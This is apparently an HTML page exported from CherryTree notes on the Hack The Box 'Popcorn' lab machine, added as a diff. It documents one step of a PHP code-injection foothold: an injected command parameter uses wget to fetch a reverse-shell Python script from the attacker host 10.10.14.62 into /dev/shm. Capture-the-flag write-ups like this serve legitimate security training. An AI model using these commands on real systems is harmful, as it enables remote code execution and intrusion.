@@ -1,0 +1,54 @@
+<!doctype html><html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>wget tcp_pty_handler</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="styles.css" type="text/css" />
+</head>
+<body><div class="main"><div class="tree">
+<p><strong>Index</strong></p>
+<p><a href="HacktheBox--Linux_Boxes--popcorn.html">popcorn</a></p>
+
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--popcorn--nmap.html">nmap</a></li>
+<li><a href="HacktheBox--Linux_Boxes--popcorn--http.html">http</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--popcorn--http--dirbuster.html">dirbuster</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--popcorn--http--dirbuster---test.html">/test</a></li>
+<li><a href="HacktheBox--Linux_Boxes--popcorn--http--dirbuster---torrent.html">/torrent</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--popcorn--http--dirbuster---torrent--register.html">register</a></li>
+</ol>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--popcorn--foothold.html">foothold </a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--popcorn--foothold--upload_save_directory.html">upload save directory</a></li>
+<li><a href="HacktheBox--Linux_Boxes--popcorn--foothold--upload_noss.png.html">upload noss.png </a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--popcorn--foothold--upload_noss.png--kali_torrent_dl_and_upload_(fail).html">kali torrent dl and upload (fail)</a></li>
+<li><a href="HacktheBox--Linux_Boxes--popcorn--foothold--upload_noss.png--test.torrent_(fail).html">test.torrent (fail)</a></li>
+<li><a href="HacktheBox--Linux_Boxes--popcorn--foothold--upload_noss.png--torrent_file_(success).html">torrent file (success)</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--popcorn--foothold--upload_noss.png--torrent_file_(success)--edit_this_torrent-change_screenshot.html">edit this torrent/change screenshot</a></li>
+<li><a href="HacktheBox--Linux_Boxes--popcorn--foothold--upload_noss.png--torrent_file_(success)--Repeater_simple_php_code_injection.html">Repeater simple php code injection</a></li>
+<ol>
+<li><a href="theBox--Linux_Boxes--popcorn--foothold--upload_noss.png--torrent_file_(success)--Repeater_simple_php_code_injection--wget_tcp_pty_handler.html">wget tcp_pty_handler</a></li>
+<li><a href="HacktheBox--Linux_Boxes--popcorn--foothold--upload_noss.png--torrent_file_(success)--Repeater_simple_php_code_injection--reverse_shell.html">reverse shell</a></li>
+</ol>
+</ol>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--popcorn--Privesc.html">Privesc</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--popcorn--Privesc--lse.sh.html">lse.sh</a></li>
+<li><a href="HacktheBox--Linux_Boxes--popcorn--Privesc--MotD_Privesc.html">MotD Privesc</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--popcorn--Privesc--MotD_Privesc--14339.sh.html">14339.sh</a></li>
+<li><a href="HacktheBox--Linux_Boxes--popcorn--Privesc--MotD_Privesc--14339.sh_raw_code.html">14339.sh raw code</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--popcorn--Privesc--root.html">root</a></li>
+</ol></ol></div>
+<div class="page"><h1><b><u>wget tcp_pty_handler</u></b></h1><span style="color:#24ff00;">lets set our cmd ‘st0ve’ as a wget grabbing our tcp shell script and name it rev.py:</span><br /><br />but first lets spin up our http server:<br /><img src="images/2009-1.png" alt="images/2009-1.png" /><br /><br /><br /><span style="color:#ffa500;">st0ve=wget 10.10.14.62/tcp_pty_backconnect.py -O /dev/shm/rev.py</span><br /><img src="images/2009-2.png" alt="images/2009-2.png" /><br /><img src="images/2009-3.png" alt="images/2009-3.png" /><br /><br /><br /><span style="color:#24ff00;">we can check the file by using cat</span><span style="color:#ffa500;"> /dev/shm/.rev.py</span><br /><img src="images/2009-4.png" alt="images/2009-4.png" /><br /><img src="images/2009-5.png" alt="images/2009-5.png" /><br /><br /><br /><br /></div></div>
+</body></html>
